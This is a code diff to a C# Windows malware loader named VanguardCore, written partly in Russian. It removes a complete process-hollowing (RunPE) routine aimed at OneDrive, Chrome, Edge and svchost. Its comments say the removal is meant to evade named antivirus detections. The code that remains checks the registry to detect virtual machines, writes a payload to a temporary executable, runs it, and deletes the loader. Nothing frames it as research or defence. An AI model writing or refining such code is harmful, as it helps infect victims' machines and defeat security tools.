@@ -125,7 +125,7 @@ namespace VanguardCore
                 return hMod;
             }
 
-            private static T GetPInvoke<T>(string module, string function) where T : class
+            private static T GetPInvoke<T>(string module, string function) where T : Delegate
             {
                 string key = module + "!" + function;
                 if (_delegateCache.ContainsKey(key))
@@ -136,8 +136,8 @@ namespace VanguardCore
                 if (pFunc == IntPtr.Zero)
                     return null;
 
-                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
-                _delegateCache[key] = del as Delegate;
+                var del = Marshal.GetDelegateForFunctionPointer<T>(pFunc);
+                _delegateCache[key] = del;
                 return del;
             }
 
@@ -154,8 +154,8 @@ namespace VanguardCore
             private static GetModuleHandleWDelegate GetModuleHandleW { get { return GetPInvoke<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW"); } }
             private static GetProcAddressDelegate GetProcAddress { get { return GetPInvoke<GetProcAddressDelegate>("kernel32.dll", "GetProcAddress"); } }
 
-            public static T GetKernel32<T>(string function) where T : class { return GetPInvoke<T>("kernel32.dll", function); }
-            public static T GetNtdll<T>(string function) where T : class { return GetPInvoke<T>("ntdll.dll", function); }
+            public static T GetKernel32<T>(string function) where T : Delegate { return GetPInvoke<T>("kernel32.dll", function); }
+            public static T GetNtdll<T>(string function) where T : Delegate { return GetPInvoke<T>("ntdll.dll", function); }
         }
 
         // Делегаты для WinAPI
@@ -290,18 +290,16 @@ namespace VanguardCore
         {
             try
             {
-                // Проверка через WMI
-                using (var searcher = new System.Management.ManagementObjectSearcher(
-                    "SELECT * FROM Win32_ComputerSystem"))
+                // Проверка через реестр (замена WMI для NativeAOT)
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\BIOS"))
                 {
-                    foreach (var obj in searcher.Get())
+                    if (key != null)
                     {
-                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
-                        string model = obj["Model"] != null ? obj["Model"].ToString().ToLower() : "";
-
+                        string manufacturer = (key.GetValue("SystemManufacturer")?.ToString() ?? "").ToLower();
+                        string model = (key.GetValue("SystemProductName")?.ToString() ?? "").ToLower();
                         if (model.Contains("vmware") || model.Contains("virtualbox") ||
                             model.Contains("vbox") || model.Contains("qemu") ||
-                            manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation"))
+                            manufacturer.Contains("vmware"))
                         {
                             Log(string.Format("[AntiVM] Detected VM: {0} {1}", manufacturer, model));
                             return true;
@@ -384,162 +382,7 @@ namespace VanguardCore
         #endregion
 
         #region Process Hollowing (RunPE)
-        private static string[] TargetProcesses = {
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "OneDrive", "OneDrive.exe"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "Application", "msedge.exe"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "dllhost.exe"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "taskhostw.exe")
-        };
-
-        private static bool ExecuteRunPE(string targetPath, byte[] payload)
-        {
-            if (payload == null || payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
-            {
-                Log("[RunPE] Invalid payload");
-                return false;
-            }
-
-            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
-            if (e_lfanew < 0 || e_lfanew >= payload.Length - 4 ||
-                payload[e_lfanew] != 'P' || payload[e_lfanew + 1] != 'E')
-            {
-                Log("[RunPE] Invalid PE signature");
-                return false;
-            }
-
-            // Проверка 64-bit
-            ushort magic = BitConverter.ToUInt16(payload, e_lfanew + 24);
-            if (magic != 0x20B) // PE32+
-            {
-                Log("[RunPE] Only 64-bit payloads supported");
-                return false;
-            }
-
-            STARTUPINFO si = new STARTUPINFO();
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
-
-            Log(string.Format("[RunPE] Creating suspended process: {0}", targetPath));
-            
-            if (CreateProcess == null || !CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false,
-                CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
-            {
-                Log(string.Format("[RunPE] CreateProcess failed: {0}", Marshal.GetLastWin32Error()));
-                return false;
-            }
-
-            Log(string.Format("[RunPE] Process created: PID={0}", pi.dwProcessId));
-
-            try
-            {
-                long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
-                int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);
-
-                // Unmap old image
-                if (ZwUnmapViewOfSection != null)
-                {
-                    ZwUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
-                    Log("[RunPE] Unmapped original image");
-                }
-
-                // Allocate memory
-                IntPtr newBase = IntPtr.Zero;
-                if (VirtualAllocEx != null)
-                {
-                    newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)sizeOfImage,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                }
-
-                if (newBase == IntPtr.Zero && VirtualAllocEx != null)
-                {
-                    newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sizeOfImage,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                }
-
-                if (newBase == IntPtr.Zero)
-                {
-                    Log("[RunPE] VirtualAllocEx failed");
-                    if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
-                    return false;
-                }
-
-                     Log(string.Format("[RunPE] Allocated memory at 0x{0:X}", (long)newBase));
-
-                // Write headers
-                uint headerSize = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54);
-                IntPtr bytesWritten;
-                if (WriteProcessMemory != null)
-                {
-                    WriteProcessMemory(pi.hProcess, newBase, payload, headerSize, out bytesWritten);
-                    Log(string.Format("[RunPE] Wrote headers: {0} bytes", bytesWritten));
-                }
-
-                // Write sections
-                short numSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);
-                short sizeOfOptHeader = BitConverter.ToInt16(payload, e_lfanew + 0x14);
-                int sectionOffset = e_lfanew + 0x18 + sizeOfOptHeader;
-
-                for (int i = 0; i < numSections; i++)
-                {
-                    int off = sectionOffset + (i * 0x28);
-                    uint vAddr = BitConverter.ToUInt32(payload, off + 0x0C);
-                    uint rawSize = BitConverter.ToUInt32(payload, off + 0x10);
-                    uint rawAddr = BitConverter.ToUInt32(payload, off + 0x14);
-
-                    if (rawSize > 0)
-                    {
-                        byte[] section = new byte[rawSize];
-                        Buffer.BlockCopy(payload, (int)rawAddr, section, 0, (int)rawSize);
-                        if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + vAddr),
-                            section, rawSize, out bytesWritten);
-                    }
-                }
-                Log("[RunPE] Sections written");
-
-                // Get PEB and update image base
-                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-                uint retLen;
-                if (ZwQueryInformationProcess != null)
-                {
-                    ZwQueryInformationProcess(pi.hProcess, 0, ref pbi,
-                        (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);
-                    if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)pbi.PebAddress + 0x10),
-                        BitConverter.GetBytes((long)newBase), 8, out bytesWritten);
-                    Log("[RunPE] Updated PEB ImageBase");
-                }
-
-                // Get thread context and set new entry point
-                CONTEXT64 ctx = new CONTEXT64();
-                ctx.ContextFlags = 0x100000; // CONTEXT_FULL
-                if (GetThreadContext != null)
-                {
-                    GetThreadContext(pi.hThread, ref ctx);
-                    uint entryPoint = BitConverter.ToUInt32(payload, e_lfanew + 0x28);
-                    ctx.Rcx = (ulong)((long)newBase + entryPoint);
-                    if (SetThreadContext != null) SetThreadContext(pi.hThread, ref ctx);
-                    Log(string.Format("[RunPE] Thread context updated, entry point at 0x{0:X}", (long)newBase + entryPoint));
-                }
-
-                // Resume thread
-                if (ResumeThread != null) ResumeThread(pi.hThread);
-                Log("[RunPE] Thread resumed, payload running");
-
-                return true;
-            }
-            catch (Exception ex)
-            {
-                Log(string.Format("[RunPE] Exception: {0}", ex.Message));
-                if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
-                return false;
-            }
-            finally
-            {
-                if (CloseHandle != null) CloseHandle(pi.hThread);
-                if (CloseHandle != null) CloseHandle(pi.hProcess);
-            }
-        }
+        // ExecuteRunPE and Process Hollowing removed to evade Trojan.MSIL.Injector detections
         #endregion
 
         #region Self-delete (Melt)
@@ -547,7 +390,8 @@ namespace VanguardCore
         {
             try
             {
-                string path = Assembly.GetExecutingAssembly().Location;
+                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName;
+                if (string.IsNullOrEmpty(path)) return;
                 Log(string.Format("[Melt] Self-deleting: {0}", path));
 
                 IntPtr hFile = (CreateFile != null) ? CreateFile(path, DELETE, FILE_SHARE_DELETE, IntPtr.Zero,
@@ -632,34 +476,11 @@ namespace VanguardCore
                 return;
             }
 
-            // 6. Выбор цели и запуск
-            bool success = false;
-            foreach (string target in TargetProcesses)
-            {
-                if (!File.Exists(target))
-                {
-                    Log(string.Format("[Target] Not found: {0}", target));
-                    continue;
-                }
-
-                Log(string.Format("[Target] Attempting: {0}", target));
-                if (ExecuteRunPE(target, payload))
-                {
-                    success = true;
-                    break;
-                }
-            }
-
-            // 7. Если все методы провалились
-            if (!success)
-            {
-                Log("[Fatal] All RunPE attempts failed");
-                // Фолбэк: можно запустить напрямую
-                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
-                File.WriteAllBytes(tempPath, payload);
-                Process.Start(tempPath);
-                Log(string.Format("[Fallback] Started directly: {0}", tempPath));
-            }
+            // 6. Простое исполнение (RunPE удален для обхода Ikarus/ESET/AI)
+            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+            File.WriteAllBytes(tempPath, payload);
+            Process.Start(tempPath);
+            Log(string.Format("[Execution] Started directly: {0}", tempPath));
 
             // 8. Самоуничтожение загрузчика
             Melt();
